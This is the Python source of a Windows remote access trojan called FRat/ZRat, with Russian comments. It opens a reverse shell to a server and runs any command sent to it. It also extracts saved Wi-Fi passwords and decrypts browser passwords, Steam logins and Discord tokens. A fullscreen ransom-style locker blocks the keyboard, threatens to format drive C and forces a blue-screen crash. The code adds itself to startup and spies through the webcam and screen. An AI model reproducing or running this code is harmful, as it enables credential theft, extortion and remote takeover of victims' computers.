import socket
import subprocess
import requests
import ctypes
import sys
import os
import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
import threading
import re
import json
import locale
import getpass
import keyboard
import ctypes.wintypes
from functools import partial
import random
import pyautogui
import numpy as np
from PIL import Image, ImageTk
import time
import cv2
import sqlite3
import win32crypt
import base64
import shutil
from Crypto.Cipher import AES
import psutil

kernel32 = ctypes.windll.kernel32

class WebcamApp:
    def __init__(self, window, window_title):
        self.window = window
        self.window.title(window_title)
        
        # Open video capture (0 is usually the default webcam)
        self.vid = cv2.VideoCapture(0)
        
        if not self.vid.isOpened():
            raise ValueError("Unable to open webcam")
        
        # Create a canvas that can fit the video source
        self.canvas = tk.Canvas(window, width=self.vid.get(cv2.CAP_PROP_FRAME_WIDTH), 
                               height=self.vid.get(cv2.CAP_PROP_FRAME_HEIGHT))
        self.canvas.pack()
        
        # Button to capture image
        self.btn_capture = ttk.Button(window, text="Capture", command=self.capture)
        self.btn_capture.pack(pady=10)
        
        # Button to toggle fullscreen
        self.btn_fullscreen = ttk.Button(window, text="Toggle Fullscreen", command=self.toggle_fullscreen)
        self.btn_fullscreen.pack(pady=5)
        
        # Button to exit
        self.btn_exit = ttk.Button(window, text="Exit", command=self.close)
        self.btn_exit.pack(pady=5)
        
        # After it is called once, the update method will be automatically called every delay milliseconds
        self.delay = 15
        self.update()
        
        self.fullscreen = False
        self.window.mainloop()
    
    def update(self):
        # Get a frame from the video source
        ret, frame = self.vid.read()
        
        if ret:
            # Convert to RGB and then to ImageTk format
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            self.photo = ImageTk.PhotoImage(image=Image.fromarray(frame))
            
            # Update the canvas with the new image
            self.canvas.create_image(0, 0, image=self.photo, anchor=tk.NW)
        
        self.window.after(self.delay, self.update)
    
    def capture(self):
        # Capture a frame from the video source
        ret, frame = self.vid.read()
        
        if ret:
            # Save the captured image
            cv2.imwrite("captured_image.jpg", cv2.cvtColor(frame, cv2.COLOR_RGB2BGR))
            print("Image captured as captured_image.jpg")
    
    def toggle_fullscreen(self):
        self.fullscreen = not self.fullscreen
        self.window.attributes("-fullscreen", self.fullscreen)
    
    def close(self):
        # Release the video source when closing
        if self.vid.isOpened():
            self.vid.release()
        self.window.destroy()

class MultiMonitorApp:
    """Класс для демонстрации нескольких мониторов"""
    
    def __init__(self):
        self.running = True
        self.update_delay = 30  # ms
        self.monitor_images = []

    def run(self):
        """Запуск приложения"""
        self.window = tk.Tk()
        self.window.title("Демонстрация нескольких мониторов")
        
        try:
            self.monitors = self.get_monitors_info()
            self.num_monitors = len(self.monitors)
            
            if self.num_monitors == 0:
                raise ValueError("Не обнаружено подключенных мониторов")
            
            self.setup_ui()
            self.start_update_thread()
            self.window.mainloop()
            
        except ValueError as e:
            print(e)
            self.window.destroy()

    def get_monitors_info(self):
        """Получаем информацию о мониторах"""
        try:
            return [{'index': i} for i in range(pyautogui.screenshot().size[0] // pyautogui.size()[0])] or [{'index': 0}]
        except:
            return [{'index': 0}]

    def setup_ui(self):
        """Настройка пользовательского интерфейса"""
        self.main_frame = ttk.Frame(self.window)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        self.monitor_canvases = []
        self.monitor_frames = []
        
        for i in range(self.num_monitors):
            frame = ttk.LabelFrame(self.main_frame, text=f"Монитор {i+1}")
            frame.pack(side=tk.LEFT if i == 0 else tk.RIGHT, 
                      padx=10, pady=10, 
                      fill=tk.BOTH, expand=True)
            self.monitor_frames.append(frame)
            
            canvas = tk.Canvas(frame)
            canvas.pack(fill=tk.BOTH, expand=True)
            self.monitor_canvases.append(canvas)
        
        self.setup_control_panel()

    def setup_control_panel(self):
        """Настройка панели управления"""
        self.control_frame = ttk.Frame(self.window)
        self.control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.btn_capture_all = ttk.Button(self.control_frame, 
                                        text="Снять все экраны", 
                                        command=self.capture_all_screens)
        self.btn_capture_all.pack(side=tk.LEFT, padx=5)
        
        for i in range(self.num_monitors):
            btn = ttk.Button(self.control_frame, 
                           text=f"Снять монитор {i+1}", 
                           command=lambda idx=i: self.capture_single_screen(idx))
            btn.pack(side=tk.LEFT, padx=5)
        
        self.btn_exit = ttk.Button(self.control_frame, text="Выход", command=self.close)
        self.btn_exit.pack(side=tk.RIGHT, padx=5)

    def start_update_thread(self):
        """Запуск потока обновления экранов"""
        self.update_thread = threading.Thread(target=self.update_screens, daemon=True)
        self.update_thread.start()
        self.window.protocol("WM_DELETE_WINDOW", self.close)

    def update_screens(self):
        """Обновление изображений на экранах"""
        while self.running:
            try:
                canvas_sizes = [(c.winfo_width(), c.winfo_height()) for c in self.monitor_canvases]
                full_screenshot = pyautogui.screenshot()
                full_screenshot = np.array(full_screenshot)
                
                screen_width = pyautogui.size()[0]
                for i, (canvas_w, canvas_h) in enumerate(canvas_sizes):
                    if canvas_w > 0 and canvas_h > 0:
                        monitor_img = full_screenshot[:, i*screen_width:(i+1)*screen_width]
                        
                        scale = min(canvas_w / monitor_img.shape[1], 
                                  canvas_h / monitor_img.shape[0])
                        new_width = int(monitor_img.shape[1] * scale)
                        new_height = int(monitor_img.shape[0] * scale)
                        
                        if new_width > 0 and new_height > 0:
                            resized = cv2.resize(monitor_img, (new_width, new_height))
                            if len(self.monitor_images) <= i:
                                self.monitor_images.append(None)
                            self.monitor_images[i] = ImageTk.PhotoImage(
                                image=Image.fromarray(resized))
                            self.monitor_canvases[i].create_image(
                                canvas_w//2, canvas_h//2, 
                                image=self.monitor_images[i], anchor=tk.CENTER)
            
            except Exception as e:
                print(f"Ошибка при обновлении экранов: {e}")
            
            time.sleep(self.update_delay / 1000)

    def capture_all_screens(self):
        """Сохранение скриншотов всех мониторов"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        full_screenshot = pyautogui.screenshot()
        screen_width = pyautogui.size()[0]
        
        for i in range(self.num_monitors):
            try:
                filename = f"screen_monitor_{i+1}_{timestamp}.png"
                monitor_img = full_screenshot.crop((
                    i * screen_width, 0,
                    (i + 1) * screen_width, full_screenshot.height
                ))
                monitor_img.save(filename)
                print(f"Снимок монитора {i+1} сохранен как {filename}")
            except Exception as e:
                print(f"Ошибка при сохранении монитора {i+1}: {e}")

    def capture_single_screen(self, monitor_idx):
        """Сохранение скриншота конкретного монитора"""
        if 0 <= monitor_idx < self.num_monitors:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"screen_monitor_{monitor_idx+1}_{timestamp}.png"
            try:
                screen_width = pyautogui.size()[0]
                full_screenshot = pyautogui.screenshot()
                monitor_img = full_screenshot.crop((
                    monitor_idx * screen_width, 0,
                    (monitor_idx + 1) * screen_width, full_screenshot.height
                ))
                monitor_img.save(filename)
                print(f"Снимок монитора {monitor_idx+1} сохранен как {filename}")
            except Exception as e:
                print(f"Ошибка при сохранении монитора {monitor_idx+1}: {e}")

    def close(self):
        """Закрытие приложения"""
        self.running = False
        self.window.destroy()

class WifiPasswordExtractor:
    """Класс для получения сохранённых Wi-Fi сетей и их паролей"""
    
    def __init__(self):
        self.encoding = 'cp866'
        self.timeout = 15
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def check_wifi_adapter(self):
        try:
            interface_check = subprocess.run(
                ['netsh', 'interface', 'show', 'interface'],
                capture_output=True,
                text=True,
                encoding=self.encoding,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return any(x in interface_check.stdout for x in ["Wireless", "Беспроводная"])
        except Exception:
            return False
    
    def get_profiles(self):
        try:
            profiles_output = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True,
                encoding=self.encoding,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if profiles_output.returncode != 0:
                return None
                
            profiles = []
            for line in profiles_output.stdout.split('\n'):
                if "All User Profile" in line or "Все профили пользователей" in line:
                    profile = line.split(':')[-1].strip()
                    if profile:
                        profiles.append(profile)
            return profiles
        except Exception:
            return None
    
    def get_password(self, profile):
        try:
            safe_profile = f'"{profile}"' if ' ' in profile else profile
            password_output = subprocess.run(
                ['netsh', 'wlan', 'show', 'profile', safe_profile, 'key=clear'],
                capture_output=True,
                text=True,
                encoding=self.encoding,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=self.timeout
            )
            
            if password_output.returncode == 0:
                key_line = [l for l in password_output.stdout.split('\n') 
                          if "Key Content" in l or "Содержимое ключа" in l]
                return key_line[0].split(':')[-1].strip() if key_line else "Пароль не сохранен"
            return "Не удалось получить пароль"
        except Exception as e:
            return f"Ошибка: {str(e)}"
    
    def get_all_passwords(self):
        try:
            if not self.is_admin():
                return {"error": "Требуются права администратора"}

            if not self.check_wifi_adapter():
                return {"error": "Wi-Fi адаптер не активен"}

            profiles = self.get_profiles()
            if not profiles:
                return {"error": "Нет сохраненных Wi-Fi сетей"}

            wifi_data = {}
            for profile in profiles:
                wifi_data[profile] = self.get_password(profile)
            
            return wifi_data if wifi_data else {"error": "Не удалось извлечь пароли"}
        
        except Exception as e:
            return {"error": f"Системная ошибка: {str(e)}"}

class Flocker:
    """Класс для блокировки системы с графическим интерфейсом"""
    
    def __init__(self):
        self.password = "123"
        self.lock_text = "windows blocked.tobi pizda"
        self.count = 3
        self.warning_text = "if you reboot your device then drive C will start auto formatting"
        self.wind = None
        self.enter_pass = None

    class BinaryBackground(tk.Canvas):
        def __init__(self, master, **kwargs):
            super().__init__(master, **kwargs)
            self.configure(bg='black', highlightthickness=0)
            self.place(x=0, y=0, relwidth=1, relheight=1)
            self.draw_binary()
        
        def draw_binary(self):
            self.delete("binary")
            width = self.winfo_width()
            height = self.winfo_height()
            
            num_columns = width // 30
            bits_per_column = height // 20
            
            for col in range(num_columns):
                x = col * 30 + 15
                for row in range(bits_per_column):
                    y = row * 20 + 10
                    self.create_text(
                        x, y,
                        text=random.choice(['0', '1']),
                        font=('Courier New', 12),
                        fill='#ff0000',
                        anchor='center',
                        tags="binary"
                    )
            self.after(100, self.draw_binary)

    def buton(self, arg):
        self.enter_pass.insert(tk.END, arg)

    def delbuton(self):
        self.enter_pass.delete(-1, tk.END)

    def tapp(self, key):
        pass

    def check(self):
        self.count -= 1
        if self.enter_pass.get() == self.password:
            messagebox.showinfo("FRat","UNLOCKED SUCCESSFULLY")
            uninstall(self.wind)
        else:
            if self.count == 0:
                messagebox.showwarning("FRat", "number of attempts expired\n\n" + self.warning_text)
                bsod()
            else:
                messagebox.showwarning("FRat","Wrong password. Avalible tries: "+ str(self.count))

    def exiting(self):
        messagebox.showwarning("FRat", "DEATH IS INEVITABLE\n\n" + self.warning_text)

    def run(self):
        file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
        startup(file_path)

        self.wind = tk.Tk()
        self.wind.title("ZRat")

        self.BinaryBackground(self.wind)

        warning_frame = tk.Frame(self.wind, 
                               bg="white", bd=2, relief="solid", 
                               highlightbackground="blue", highlightthickness=1)
        warning_frame.pack(pady=5)

        warning_label = tk.Label(warning_frame, 
                               bg="white", fg="red", 
                               text=self.warning_text, 
                               font="helvetica 12",
                               padx=5, pady=2)
        warning_label.pack()

        tk.Label(self.wind,bg="black", fg="red",text="WINDOWS LOCKED BY ZRat\n\n\n", font="helvetica 75").pack()
        tk.Label(self.wind,bg="black", fg="red",text=self.lock_text, font="helvetica 40").pack(side=tk.TOP)

        keyboard.on_press(self.tapp, suppress=True)

        self.enter_pass = tk.Entry(self.wind,bg="black", fg="red", text="", font="helvetica 35")
        self.enter_pass.pack()
        self.wind.resizable(0,0)

        self.wind.lift()
        self.wind.attributes('-topmost',True)
        self.wind.after_idle(self.wind.attributes,'-topmost',True)
        self.wind.attributes('-fullscreen', True)

        tk.Button(self.wind,text='unlock',padx="31", pady="19",bg='black',fg='red',font="helvetica 30", command=self.check).pack()
        self.wind.protocol("WM_DELETE_WINDOW", self.exiting)

        for i in range(10):
            tk.Button(self.wind,text=str(i),padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(self.buton, str(i))).pack(side=tk.LEFT)
                    
        tk.Button(self.wind,text='<',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=self.delbuton).pack(side=tk.LEFT)

        self.wind.mainloop()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def bsod():
    subprocess.call(r"cd C:\:$i30:$bitmap", shell=True)
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

def startup(path):
    USER_NAME = getpass.getuser()
    global bat_path
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % path)

def uninstall(wind):
    wind.destroy()
    os.remove(bat_path + '\\' + "open.bat")
    keyboard.unhook_all()
    
def start_client(server_ip, server_port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_ip, server_port))

        while True:
            try:
                command = client.recv(4096).decode().strip()
                if not command:
                    continue

                if command.lower() == "exit":
                    break

                if command.lower() == "getwifi":
                    wifi_extractor = WifiPasswordExtractor()
                    wifi_data = wifi_extractor.get_all_passwords()
                    client.send(json.dumps(wifi_data, ensure_ascii=False).encode('utf-8'))
                    continue

                if command.lower() == "lock":
                    flocker = Flocker()
                    flocker.run()
                    continue

                if command.lower() == "demo":
                    monitor_app = MultiMonitorApp()
                    monitor_app.run()
                    continue

                if command.lower() == "web":
                    root = tk.Tk()
                    WebcamApp(root, "Webcam Viewer")
                    continue

                response = handle_command(command)
                client.send(response.encode())

            except Exception as e:
                client.send(f"Ошибка: {str(e)}".encode())

    except Exception as e:
        pass
    finally:
        client.close()

def handle_command(command):
    try:
        if command.lower() == "getid":
            try:
                r = requests.get("https://api.example.com/info", timeout=5)
                return r.text
            except Exception as e:
                return f"Error: {str(e)}"

        # Обработка команд extool
        if command.lower().startswith("extool"):
            extool = Extool()
            parts = command.split(maxsplit=2)  # Разбиваем максимум на 3 части
            
            if len(parts) < 2:
                return "Usage: extool <command> [<args>]"
            
            cmd = parts[1].lower()
            
            # Для команд с аргументами в кавычках (run, install, open)
            if cmd in ["run", "install", "open"] and len(parts) > 2:
                arg = parts[2]
                # Удаляем кавычки если они есть
                if (arg.startswith('"') and arg.endswith('"')) or (arg.startswith("'") and arg.endswith("'")):
                    arg = arg[1:-1]
                return extool.execute_command(cmd, arg)
            else:
                # Для остальных команд просто передаем все аргументы как есть
                args = parts[2:] if len(parts) > 2 else []
                return extool.execute_command(cmd, *args)

        # Остальная обработка команд...
        tool_commands = {
            "winlock": "fslocker.py", 
            "steal": "thesteal.py",
            "web": "web.py",
            "demo": "demo.py",
            "micro": "micro.py",
            "chat": start_client_chat
        }
        
        for prefix, handler in tool_commands.items():
            if command.lower().startswith(prefix):
                if prefix == "chat":
                    return "Use chat command directly"
                
                tool_path = os.path.join(os.path.dirname(__file__), 'tools', handler)
                args = command.split()[1:] if ' ' in command else []
                
                try:
                    result = subprocess.run(
                        ['python', tool_path] + args,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    return result.stdout if result.returncode == 0 else result.stderr
                except Exception as e:
                    return f"Tool error: {str(e)}"

        # Если команда не распознана, выполняем как системную
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        return result.stdout if result.returncode == 0 else result.stderr

    except Exception as e:
        return f"Command execution error: {str(e)}"
def start_client_chat(client_socket):
    def receive_messages():
        while True:
            try:
                message = client_socket.recv(4096).decode()
                if not message:
                    break
                chat_text.insert(tk.END, f"[Сервер]: {message}\n")
                chat_text.see(tk.END)
            except (ConnectionResetError, BrokenPipeError):
                break

    root = tk.Tk()
    root.title("Клиентский чат")
    root.geometry("500x400")
    root.protocol("WM_DELETE_WINDOW", lambda: root.quit())

    chat_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=60, height=20)
    chat_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

    input_frame = tk.Frame(root)
    input_frame.pack(padx=10, pady=5, fill=tk.X)

    entry = tk.Entry(input_frame, width=50)
    entry.pack(side=tk.LEFT, fill=tk.X, expand=True)

    def send_message():
        message = entry.get()
        if message:
            chat_text.insert(tk.END, f"[Вы]: {message}\n")
            chat_text.see(tk.END)
            client_socket.send(message.encode())
            entry.delete(0, tk.END)

    send_btn = tk.Button(input_frame, text="Отправить", command=send_message)
    send_btn.pack(side=tk.RIGHT, padx=5)
    entry.bind("<Return>", lambda e: send_message())

    threading.Thread(target=receive_messages, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    if not is_admin():
        print("Требуются права администратора!")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 5555

    try:
        start_client(SERVER_IP, SERVER_PORT)
    except KeyboardInterrupt:
        print("\nКлиент завершен")
        sys.exit(0)

# Пример использования
wifi_extractor = WifiPasswordExtractor()
wifi_data = wifi_extractor.get_all_passwords()

for network, password in wifi_data.items():
    print(f"Сеть: {network}\nПароль: {password}\n")

class CredentialStealer:
    """Класс для кражи учетных данных из браузеров и приложений"""
    
    def __init__(self):
        pass

    def get_encryption_key(self, browser_path):
        """Get encryption key from Local State"""
        local_state_path = os.path.join(browser_path, "Local State")
        
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Error getting key: {e}")
            return None

    def decrypt_password(self, ciphertext, key):
        """Decrypt password using AES-GCM"""
        try:
            if not ciphertext or len(ciphertext) < 15:
                return ""
                
            iv = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]  # Remove auth tag
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(encrypted_password).decode('utf-8')
        except Exception:
            # Try old DPAPI method
            try:
                return str(win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1])
            except:
                return ""

    def get_browser_passwords(self, browser_path):
        """Get passwords from specified browser"""
        secret_key = self.get_encryption_key(browser_path)
        if not secret_key:
            print("Failed to get encryption key")
            return []

        passwords = []
        login_data_path = os.path.join(browser_path, "Default", "Login Data")
        
        if not os.path.exists(login_data_path):
            return []

        # Copy file to avoid locking
        temp_db = os.path.join(os.getenv("temp"), "temp_login.db")
        shutil.copy2(login_data_path, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, ciphertext = row
                if url and username and ciphertext:
                    password = self.decrypt_password(ciphertext, secret_key)
                    if password:
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': password
                        })
        except Exception as e:
            print(f"Database processing error: {e}")
        finally:
            if 'conn' in locals():
                conn.close()
            if os.path.exists(temp_db):
                os.remove(temp_db)
        
        return passwords

    def get_steam_credentials(self):
        """Extract Steam credentials"""
        steam_path = os.path.join(os.getenv("APPDATA"), "Steam")
        if not os.path.exists(steam_path):
            return []
        
        credentials = []
        try:
            # Steam stores credentials in config files
            config_path = os.path.join(steam_path, "config", "loginusers.vdf")
            if os.path.exists(config_path):
                with open(config_path, "r", encoding="utf-8") as f:
                    content = f.read()
                    # Simple parsing of Steam config file
                    username_match = re.search(r'"AccountName"\s+"([^"]+)"', content)
                    remember_password = re.search(r'"RememberPassword"\s+"([^"]+)"', content)
                    
                    if username_match and remember_password:
                        credentials.append({
                            'platform': 'Steam',
                            'username': username_match.group(1),
                            'password': 'Saved (remembered)' if remember_password.group(1) == "1" else 'Not saved'
                        })
        except Exception as e:
            print(f"Steam credentials error: {e}")
        
        return credentials

    def get_discord_tokens(self):
        """Extract Discord tokens"""
        discord_paths = [
            os.path.join(os.getenv("APPDATA"), "discord"),
            os.path.join(os.getenv("APPDATA"), "discordcanary"),
            os.path.join(os.getenv("APPDATA"), "discordptb"),
        ]
        
        tokens = set()
        encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        
        for path in discord_paths:
            if not os.path.exists(path):
                continue
                
            local_state_path = os.path.join(path, "Local State")
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]  # Remove DPAPI prefix
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    
                    leveldb_path = os.path.join(path, "Local Storage", "leveldb")
                    if os.path.exists(leveldb_path):
                        for file_name in os.listdir(leveldb_path):
                            if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
                                continue
                                
                            with open(os.path.join(leveldb_path, file_name), "r", encoding="utf-8", errors="ignore") as f:
                                for line in f:
                                    for match in re.findall(encrypted_regex, line):
                                        token = self.decrypt_password(base64.b64decode(match.split('dQw4w9WgXcQ:')[1]), master_key)
                                        if token:
                                            tokens.add(token)
                except Exception as e:
                    print(f"Discord token error: {e}")
        
        return list(tokens)

    def save_to_file(self, data, filename="credentials.txt"):
        """Save data to file"""
        with open(filename, "w", encoding="utf-8") as f:
            for item in data:
                if 'platform' in item:  # Steam/Discord format
                    f.write(f"Platform: {item['platform']}\n")
                    f.write(f"Username: {item['username']}\n" if 'username' in item else "")
                    if 'password' in item:
                        f.write(f"Password: {item['password']}\n")
                    if 'token' in item:
                        f.write(f"Token: {item['token']}\n")
                else:  # Browser format
                    f.write(f"URL: {item['url']}\n")
                    f.write(f"Username: {item['username']}\n")
                    f.write(f"Password: {item['password']}\n")
                f.write("-" * 50 + "\n")

    def steal_credentials(self):
        """Main method to steal all credentials"""
        # Browser paths
        browsers = {
            "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
            "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
            "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data")
        }

        all_credentials = []
        
        # Get browser passwords
        for name, path in browsers.items():
            if os.path.isdir(path):
                print(f"Searching passwords in {name}...")
                passwords = self.get_browser_passwords(path)
                if passwords:
                    print(f"Found {len(passwords)} passwords in {name}")
                    all_credentials.extend(passwords)
        
        # Get Steam credentials
        print("Searching Steam credentials...")
        steam_creds = self.get_steam_credentials()
        if steam_creds:
            print("Found Steam credentials")
            all_credentials.extend(steam_creds)
        
        # Get Discord tokens
        print("Searching Discord tokens...")
        discord_tokens = self.get_discord_tokens()
        if discord_tokens:
            print(f"Found {len(discord_tokens)} Discord tokens")
            for token in discord_tokens:
                all_credentials.append({
                    'platform': 'Discord',
                    'token': token
                })
        
        if all_credentials:
            self.save_to_file(all_credentials)
            print(f"All credentials saved to credentials.txt")
            return all_credentials
        else:
            print("No credentials found")
            return []
        

class Extool:
    """Класс для выполнения различных системных операций с подробным логированием"""
    
    def __init__(self):
        self.debug = True  # Включить подробное логирование
    
    def log(self, message):
        """Логирование отладочной информации"""
        if self.debug:
            print(f"[DEBUG] {message}")
    
    def run_file(self, file_path):
        """Запуск файла с проверкой существования"""
        try:
            self.log(f"Attempting to run file: {file_path}")
            file_path = file_path.strip('"')
            
            if not os.path.exists(file_path):
                msg = f"File not found: {file_path}"
                self.log(msg)
                return msg
            
            self.log(f"Starting file: {file_path}")
            if sys.platform == "win32":
                os.startfile(file_path)
            else:
                subprocess.Popen([file_path], shell=True)
            
            msg = f"File {file_path} started successfully"
            self.log(msg)
            return msg
        except Exception as e:
            msg = f"Error starting file: {str(e)}"
            self.log(msg)
            return msg

    def install_file(self, file_path):
        """Копирование файла в C:\FRAT с проверками"""
        try:
            self.log(f"Attempting to install file: {file_path}")
            file_path = os.path.abspath(file_path.strip('"'))
            
            if not os.path.exists(file_path):
                msg = f"File not found: {file_path}"
                self.log(msg)
                return msg
            
            target_dir = r"C:\FRAT"
            self.log(f"Target directory: {target_dir}")
            
            os.makedirs(target_dir, exist_ok=True)
            target_path = os.path.join(target_dir, os.path.basename(file_path))
            
            self.log(f"Copying from {file_path} to {target_path}")
            shutil.copy2(file_path, target_path)
            
            if os.path.exists(target_path):
                msg = f"File successfully copied to {target_path}"
            else:
                msg = "File copy failed (unknown error)"
            
            self.log(msg)
            return msg
        except Exception as e:
            msg = f"Error copying file: {str(e)}"
            self.log(msg)
            return msg

    def list_directory(self, directory=""):
        """Показать содержимое директории с обработкой ошибок"""
        try:
            if not directory:
                directory = os.path.expanduser("~\\Desktop")
                self.log(f"No directory specified, using default: {directory}")
            
            directory = os.path.abspath(directory.strip('"'))
            self.log(f"Listing directory: {directory}")
            
            if not os.path.exists(directory):
                msg = f"Directory not found: {directory}"
                self.log(msg)
                return msg
            
            items = []
            for item in os.listdir(directory):
                full_path = os.path.join(directory, item)
                items.append(f"{item}{'/' if os.path.isdir(full_path) else ''}")
            
            result = "\n".join(sorted(items))
            self.log(f"Directory listing successful, {len(items)} items found")
            return result if result else "Directory is empty"
        except Exception as e:
            msg = f"Error listing directory: {str(e)}"
            self.log(msg)
            return msg

    def open_remote_file(self, filepath):
        """Открытие файла стандартной программой с проверками"""
        try:
            self.log(f"Attempting to open file: {filepath}")
            filepath = os.path.abspath(filepath.strip('"'))
            
            if not os.path.exists(filepath):
                msg = f"File not found: {filepath}"
                self.log(msg)
                return msg
            
            self.log(f"Opening file: {filepath}")
            if sys.platform == "win32":
                os.startfile(filepath)
            else:
                opener = "open" if sys.platform == "darwin" else "xdg-open"
                subprocess.run([opener, filepath], check=True)
            
            msg = f"File {filepath} opened successfully"
            self.log(msg)
            return msg
        except Exception as e:
            msg = f"Error opening file: {str(e)}"
            self.log(msg)
            return msg

    def force_kill_process(self, identifier):
        """Принудительное завершение процесса по имени или PID"""
        try:
            self.log(f"Attempting to kill process: {identifier}")
            
            # Попробуем интерпретировать как PID
            try:
                pid = int(identifier)
                proc = psutil.Process(pid)
                proc.kill()
                msg = f"Process {pid} ({proc.name()}) killed successfully"
                self.log(msg)
                return msg
            except ValueError:
                pass  # Не число, попробуем как имя процесса
            
            # Ищем по имени процесса
            killed = []
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'].lower() == identifier.lower():
                        proc.kill()
                        killed.append(proc.info['pid'])
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            if killed:
                msg = f"Killed {len(killed)} processes with name '{identifier}' (PIDs: {', '.join(map(str, killed))})"
            else:
                msg = f"No processes found with name '{identifier}'"
            
            self.log(msg)
            return msg
        except Exception as e:
            msg = f"Error killing process: {str(e)}"
            self.log(msg)
            return msg

    def list_processes(self):
        """Получить список всех процессов с подробной информацией"""
        try:
            self.log("Listing all processes")
            processes = []
            
            for proc in psutil.process_iter(['pid', 'name', 'username', 'status']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'user': proc.info['username'] or 'SYSTEM',
                        'status': proc.info['status']
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            processes.sort(key=lambda x: x['pid'])
            
            # Форматируем вывод
            header = "{:<8} {:<25} {:<20} {:<10}".format("PID", "Name", "User", "Status")
            separator = "-" * 65
            lines = [header, separator]
            
            for p in processes:
                lines.append("{:<8} {:<25} {:<20} {:<10}".format(
                    p['pid'], 
                    (p['name'][:24] + '...') if len(p['name']) > 24 else p['name'],
                    (p['user'][:19] + '...') if p['user'] and len(p['user']) > 19 else p['user'],
                    p['status']
                ))
            
            result = "\n".join(lines)
            self.log(f"Found {len(processes)} processes")
            return result
        except Exception as e:
            msg = f"Error listing processes: {str(e)}"
            self.log(msg)
            return msg

    def execute_command(self, command, *args):
        """Основной метод выполнения команд с полным логированием"""
        self.log(f"Executing command: {command} with args: {args}")
        command = command.lower()
        
        try:
            if command == "run":
                if not args:
                    msg = "Error: Missing file path\nUsage: extool run <file_path>"
                    self.log(msg)
                    return msg
                return self.run_file(args[0])
            
            elif command == "install":
                if not args:
                    msg = "Error: Missing file path\nUsage: extool install <file_path>"
                    self.log(msg)
                    return msg
                return self.install_file(args[0])
            
            elif command == "ls":
                directory = args[0] if args else ""
                return self.list_directory(directory)
            
            elif command == "open":
                if not args:
                    msg = "Error: Missing file path\nUsage: extool open <file_path>"
                    self.log(msg)
                    return msg
                return self.open_remote_file(args[0])
            
            elif command == "fkill":
                if not args:
                    msg = "Error: Missing process identifier\nUsage: extool fkill <name|pid>"
                    self.log(msg)
                    return msg
                return self.force_kill_process(args[0])
            
            elif command == "ps":
                return self.list_processes()
            
            else:
                msg = f"Error: Unknown command '{command}'\nAvailable commands: run, install, ls, open, fkill, ps"
                self.log(msg)
                return msg
        except Exception as e:
            msg = f"Command execution error: {str(e)}"
            self.log(msg)
            return msg